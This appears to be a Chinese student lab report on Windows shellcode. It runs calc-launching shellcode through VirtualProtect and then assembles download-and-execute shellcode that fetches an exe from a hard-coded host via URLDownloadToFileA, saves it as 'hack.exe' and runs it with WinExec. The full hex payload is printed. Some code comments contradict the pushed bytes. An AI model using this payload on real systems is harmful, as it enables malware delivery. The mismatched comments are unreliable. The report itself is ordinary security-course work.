# ShellCode

## 实验过程

### shellcode初试

以下shellcode的功能是运行一个计算器程序

```c

#include <windows.h>
#include <stdio.h>

char code[] = \
"\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
"\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
"\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
"\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
"\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
"\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
"\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
"\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
"\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
"\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
"\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
"\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
"\x52\xff\xd0";

int main(int argc, char** argv)
{
    int (*func)();           //定义了一个函数指针变量，func
    func = (int(*)()) code;  //这个函数指针的变量类型是 int(*)()，把全局变量 code 赋值给 func
    (int)(*func)();
}
```

运行以上代码

出错：error C2440:  “类型强制转换”: 无法从“char [196]”转换为“int (__cdecl *)(void)” ；将.cpp文件改为.c文件，再次逐步运行

![](images/异常1.png)

在运行`(int)(*func)()`时出错,0xC0000005 内存访问异常,访问了一个未分配的内存地址或所访问的内存地址的保护属性冲突。

这一行是调用 func执行，而现在func是指向code的，也就是func的值是code的内存地址。因为它是全局变量，在程序运行起来后，就存在内存中，是进程的初始化过程就完成了内存分配，并由进程初始化程序从可执行文件中直接载入内存的。全局变量，肯定是有效地址，是可以访问的。由于code是全局变量，是数据，通常情况下，会给数据设置可读和可写的内存保护属性，但是一般不会给执行属性。但是我们要去执行它，所以可能引发了异常。

进行反汇编验证

![](images/异常2.png)

在执行到 `call        dword ptr [func]`后继续F11单步调试异常，这里 0096A000 就是code的第一个字节的位置

要修改这个错误，修改内存保护属性。使用VirtualProtect,改一下代码如下

```c
int main(int argc, char** argv)
{
	int(*func)();
	DWORD dwOldProtect;
	func = (int(*)()) code;
	VirtualProtect(func, sizeof(code), PAGE_EXECUTE_READWRITE, &dwOldProtect);
	(int)(*func)();
}
```

VirtualProtect 函数会把第一个参数，这里是 func，所指向的内存地址的 第二个参数，这里是 sizeof(code)，这段内存区域所在分页的内存属性修改为第三个参数的属性。PAGE_EXECUTE_READWRITE 表示这段内存，是可读可写可执行。通过第四个参数 dwOldProtect 反正在修改之前的内存保护属性。

运行上述代码，弹出计算器

![](images/弹出计算器.png)



利用反汇编解读这段shellcode代码，`(int)(*func)();`处下断点，反汇编，F11单步执行

![](images/反汇编1.png)

和源代码中的汇编部分相同，字节码89 E5 ... 与code相同

其实，我们这段code，就是通过前面的汇编代码，编译以后直接从汇编编译以后，从可执行文件中 dump出来的。`nasm 汇编器 编译为 .o文件`

```bash
# linux
nasm -f win32 win32-WinExec_Calc-Exit.asm -o win32-WinExec_Calc-Exit.o
for i in $(objdump -D win32-WinExec_Calc-Exit.o | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
```

如果我们用C语言编写一个运行计算器的程序，其实很简单。我们只需要调用一下WinExec函数，或者CreateProcess函数。如果用汇编来写，也就是几条指令的事。几个参数 push 入栈以后，call函数地址就可以了。就能调用函数地址。

shellcode中还用到了字符串。至少函数地址的名称是需要的。还有调用WinExec的参数 calc.exe

- 如果我们在C语言里编程，编译器会把可执行程序的代码和字符串，放在不同的地址。代码 机器指令在 text段中， 字符串在data段中。地址相差很远。而我们objdump，只取了代码段，没有取数据段，那要shellcode就太大了，而且中间可能会有很多的填充字符。而且数据地址很有可能是绝对地址。
- code一dump出来，放在了其他环境中执行，那么地址就变了。所以字符串，code也是找不到的。编一个程序，用到字符串，可以看看字符串的地址和代码的地址，差很远。那唯一的办法，用一种什么方式，把字符串硬编码在shellcode中。让字符串，变为代码的一部分，内嵌在机器指令中。
- 比如636c6163和6578652e是 calc.exe的big ending 反写，压入栈以后，就形成了字符串。这样就把字符串嵌入机器指令了，作为机器指令的操作数。





### 课后实验

1、详细阅读 www.exploit-db.com 中的shellcode。建议找不同功能的，不同平台的 3-4个shellcode解读。2、修改示例代码的shellcode，将其功能改为下载执行。也就是从网络中下载一个程序，然后运行下载的这个程序。提示：Windows系统中最简单的下载一个文件的API是 UrlDownlaodToFileA

首先需要获取到KERNEL32.DLL的基地址

```asm
; Find kernel32.dll base address
 xor ebx, ebx
 mov ebx, [fs:ebx+0x30]  ; EBX = Address_of_PEB
 mov ebx, [ebx+0xC]      ; EBX = Address_of_LDR
 mov ebx, [ebx+0x1C]     ; EBX = 1st entry in InitOrderModuleList / ntdll.dll
 mov ebx, [ebx]          ; EBX = 2nd entry in InitOrderModuleList / kernelbase.dll
 mov ebx, [ebx]          ; EBX = 3rd entry in InitOrderModuleList / kernel32.dll
 mov eax, [ebx+0x8]      ; EAX = &kernel32.dll / Address of kernel32.dll
 mov [ebp-0x4], eax      ; [EBP-0x04] = &kernel32.dll
```

获取kernel32.dll导出表的地址

```asm
; Find the address of the Export Table within kernel32.dll
 mov ebx, [eax+0x3C]     ; EBX = Offset NewEXEHeader
 add ebx, eax            ; EBX = &NewEXEHeader
 mov ebx, [ebx+0x78]     ; EBX = RVA ExportTable
 add ebx, eax            ; EBX = &ExportTable
 ; Find the address of the Name Pointer Table within kernel32.dll
 mov edi, [ebx+0x20]     ; EDI = RVA NamePointerTable
 add edi, eax            ; EDI = &NamePointerTable
 mov [ebp-0x8], edi      ; save &NamePointerTable to stack frame

; Find the address of the Ordinal Table
 mov ecx, [ebx+0x24]     ; ECX = RVA OrdinalTable
 add ecx, eax            ; ECX = &OrdinalTable
 mov [ebp-0xC], ecx      ; save &OrdinalTable to stack-frame

; Find the address of the Address Table
 mov edx, [ebx+0x1C]     ; EDX = RVA AddressTable
 add edx, eax            ; EDX = &AddressTable
 mov [ebp-0x10], edx     ; save &AddressTable to stack-frame

; Find Number of Functions within the Export Table of kernel32.dll
 mov edx, [ebx+0x14]     ; EDX = Number of Functions
 mov [ebp-0x14], edx     ; save value of Number of Functions to stack-frame
```

找到函数的入口点

```asm
jmp short functions

findFunctionAddr:
; Initialize the Counter to prevent infinite loop
 xor eax, eax            ; EAX = Counter = 0
 mov edx, [ebp-0x14]     ; get value of Number of Functions from stack-frame
; Loop through the NamePointerTable and compare our Strings to the Name Strings of kernel32.dll
searchLoop:
 mov edi, [ebp-0x8]      ; EDI = &NamePointerTable
 mov esi, [ebp+0x18]     ; ESI = Address of String for the Symbol we are searching for 
 xor ecx, ecx            ; ECX = 0x00000000
 cld                     ; clear direction flag - Process strings from left to right
 mov edi, [edi+eax*4]    ; EDI = RVA NameString      = [&NamePointerTable + (Counter * 4)]
 add edi, [ebp-0x4]      ; EDI = &NameString         = RVA NameString + &kernel32.dll
 add cx, 0xF             ; ECX = len("GetProcAddress,0x00") = 15 = 14 char + 1 Null
 repe cmpsb              ; compare first 8 bytes of [&NameString] to "GetProcAddress,0x00"
 jz found                ; If string at [&NameString] == "GetProcAddress,0x00", then end loop
 inc eax                 ; else Counter ++
 cmp eax, edx            ; Does EAX == Number of Functions?
 jb searchLoop           ;   If EAX != Number of Functions, then restart the loop

found:
; Find the address of WinExec by using the last value of the Counter
 mov ecx, [ebp-0xC]      ; ECX = &OrdinalTable
 mov edx, [ebp-0x10]     ; EDX = &AddressTable
 mov ax,  [ecx + eax*2]  ;  AX = ordinalNumber      = [&OrdinalTable + (Counter*2)]
 mov eax, [edx + eax*4]  ; EAX = RVA GetProcAddress = [&AddressTable + ordinalNumber]
 add eax, [ebp-0x4]      ; EAX = &GetProcAddress    = RVA GetProcAddress + &kernel32.dll
 ret

functions:
# Push string "GetProcAddress",0x00 onto the stack
 xor eax, eax            ; clear eax register
 mov ax, 0x7373          ; AX is the lower 16-bits of the 32bit EAX Register
 push eax                ;   ss : 73730000 // EAX = 0x00007373 // \x73=ASCII "s"      
 push 0x65726464         ; erdd : 65726464 // "GetProcAddress"
 push 0x41636f72         ; Acor : 41636f72
 push 0x50746547         ; PteG : 50746547
 mov [ebp-0x18], esp      ; save PTR to string at bottom of stack (ebp)
 call findFunctionAddr   ; After Return EAX will = &GetProcAddress
# EAX = &GetProcAddress
 mov [ebp-0x1C], eax      ; save &GetProcAddress

; Call GetProcAddress(&kernel32.dll, PTR "LoadLibraryA"0x00)
 xor edx, edx            ; EDX = 0x00000000
 push edx                ; null terminator for LoadLibraryA string
 push 0x41797261         ; Ayra : 41797261 // "LoadLibraryA",0x00
 push 0x7262694c         ; rbiL : 7262694c
 push 0x64616f4c         ; daoL : 64616f4c
 push esp                ; $hModule    -- push the address of the start of the string onto the stack
 push dword [ebp-0x4]    ; $lpProcName -- push base address of kernel32.dll to the stack
 mov eax, [ebp-0x1C]     ; Move the address of GetProcAddress into the EAX register
 call eax                ; Call the GetProcAddress Function.
 mov [ebp-0x20], eax     ; save Address of LoadLibraryA 


```

通过得到的LoadLibraryA函数入口，加载urlmon.dll

```asm
; Call LoadLibraryA(PTR "urlmon")
;   push "msvcrt",0x00 to the stack and save pointer
 xor eax, eax            ; clear eax
 mov ax, 0x7472          ; tr : 7472
 push eax
 push 0x6376736D         ; cvsm : 6376736D
 push esp                ; push the pointer to the string
 mov ebx, [ebp-0x20]     ; LoadLibraryA Address to ebx register
 call ebx                ; call the LoadLibraryA Function to load urlmon.dll
 mov [ebp-0x24], eax     ; save Address of urlmon.dll
```

通过`urlmon.dll`获得`URLDownloadToFileA`的入口地址

```asm
; Call GetProcAddress(urlmon.dll, "URLDownloadToFileA")
xor edx, edx
mov dx, 0x4165          ; Ae
push edx
push 0x6C69466F         ; liFo
push 0x5464616F         ; Tdao
push 0x6C6E776F         ; lnwo
push 0x444c5255         ; DLRU
push esp    		; push pointer to string to stack for 'URLDownloadToFileA'
push dword [ebp-0x24]   ; push base address of urlmon.dll to stack
mov eax, [ebp-0x1C]     ; PTR to GetProcAddress to EAX
call eax                ; GetProcAddress
;   EAX = WSAStartup Address
mov [ebp-0x28], eax     ; save Address of urlmon.URLDownloadToFileA
```

使用该函数进行[下载文件](https://www.exploit-db.com/shellcodes/13533)

```asm
;URLDownloadToFileA(NULL, URL, save as, 0, NULL)
download:
pop eax
xor ecx, ecx
push ecx
; URL: https://www.python.org/ftp/python/3.8.3/python-3.8.3.exe
push 0x6578652E         ; exe.
push 0x74646573         ; tdes
push 0x6F6F672F         ; oog/
push 0x33312E36         ; 31.6
push 0x352E3836         ; 5.86
push 0x312E3239         ; 1.29
push 0x312F2F3A         ; 1//:
push 0x70747468         ; ptth
push esp
pop ecx                 ; save the URL string
xor ebx, ebx
push ebx
; save as hack.exe
push 0x6578652E         ; exe.
push 0x6B636168         ; kcah
push esp
pop ebx                 ; save the downloaded filename string
xor edx, edx
push edx
push edx
push ebx
push ecx
push edx
mov eax, [ebp-0x28]     ; PTR to URLDownloadToFileA to EAX
call eax
pop ecx
add esp, 44
xor edx, edx
cmp eax, edx
push ecx
jnz download            ; if it fails to download , retry contineusly
pop edx
```

找到`WinExec`函数的入口地址，并调用该函数运行下载的文件，最后退出程序

```asm
 Create string 'WinExec\x00' on the stack and save its address to the stack-frame
mov edx, 0x63657878     \
shr edx, 8              ; Shifts edx register to the right 8 bits
push edx                ; "\x00,cex"
push 0x456E6957         ; EniW : 456E6957
mov [ebp+0x18], esp     ; save address of string 'WinExec\x00' to the stack-frame
call findFunctionAddr   ; After Return EAX will = &WinExec


xor ecx, ecx          ; clear eax register
push ecx              ; string terminator 0x00 for "hack.exe" string
push 0x6578652e       ; exe. : 6578652e
push 0x6B636168       ; kcah : 6B636168
mov ebx, esp          ; save pointer to "hack.exe" string in eax
inc ecx               ; uCmdShow SW_SHOWNORMAL = 0x00000001
push ecx              ; uCmdShow  - push 0x1 to stack # 2nd argument
push ebx              ; lpcmdLine - push string address stack # 1st argument
call eax              ; Call the WinExec Function

; Create string 'ExitProcess\x00' on the stack and save its address to the stack-frame
 xor ecx, ecx          ; clear eax register
 mov ecx, 0x73736501     ; 73736501 = "sse",0x01 // "ExitProcess",0x0000 string
 shr ecx, 8              ; ecx = "ess",0x00 // shr shifts the register right 8 bits
 push ecx                ;  sse : 00737365
 push 0x636F7250         ; corP : 636F7250
 push 0x74697845         ; tixE : 74697845
 mov [ebp+0x18], esp     ; save address of string 'ExitProcess\x00' to stack-frame
 call findFunctionAddr   ; After Return EAX will = &ExitProcess

; Call ExitProcess(ExitCode)
 xor edx, edx
 push edx                ; ExitCode = 0
 call eax                ; ExitProcess(ExitCode)
```

将该反汇编文件通过`nasm`工具进行编译并用`objdump`工具变为可执行代码

```bash
nasm -f win32 test.asm -o test.o
for i in $(objdump -D test.o | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
```

![](images/结果.png)

得到shellcode代码

```shell
\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41\x8b\x04\x82\x03\x45\xfc\xc3\x31\xc0\x66\xb8\x73\x73\x50\x68\x64\x64\x72\x65\x68\x72\x6f\x63\x41\x68\x47\x65\x74\x50\x89\x65\x18\xe8\xb0\xff\xff\xff\x89\x45\xe4\x31\xd2\x52\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\xff\x75\xfc\x8b\x45\xe4\xff\xd0\x89\x45\xe0\x31\xc0\x66\xb8\x6f\x6e\x50\x68\x75\x72\x6c\x6d\x54\x8b\x5d\xe0\xff\xd3\x89\x45\xdc\x31\xd2\x66\xba\x65\x41\x52\x68\x6f\x46\x69\x6c\x68\x6f\x61\x64\x54\x68\x6f\x77\x6e\x6c\x68\x55\x52\x4c\x44\x54\xff\x75\xdc\x8b\x45\xe4\xff\xd0\x89\x45\xd8\x58\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x73\x65\x64\x74\x68\x2f\x67\x6f\x6f\x68\x36\x2e\x31\x33\x68\x36\x38\x2e\x35\x68\x39\x32\x2e\x31\x68\x3a\x2f\x2f\x31\x68\x68\x74\x74\x70\x54\x59\x31\xdb\x53\x68\x2e\x65\x78\x65\x68\x68\x61\x63\x6b\x54\x5b\x31\xd2\x52\x52\x53\x51\x52\x8b\x45\xd8\xff\xd0\x59\x83\xc4\x2c\x31\xd2\x39\xd0\x51\x75\xac\x5a\xba\x78\x78\x65\x63\xc1\xea\x08\x52\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xe8\xfe\xff\xff\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x68\x61\x63\x6b\x89\xe3\x41\x51\x53\xff\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\xb7\xfe\xff\xff\x31\xd2\x52\xff\xd0
```

执行结束后出现文件，但还不能执行

![](images/结果2.png)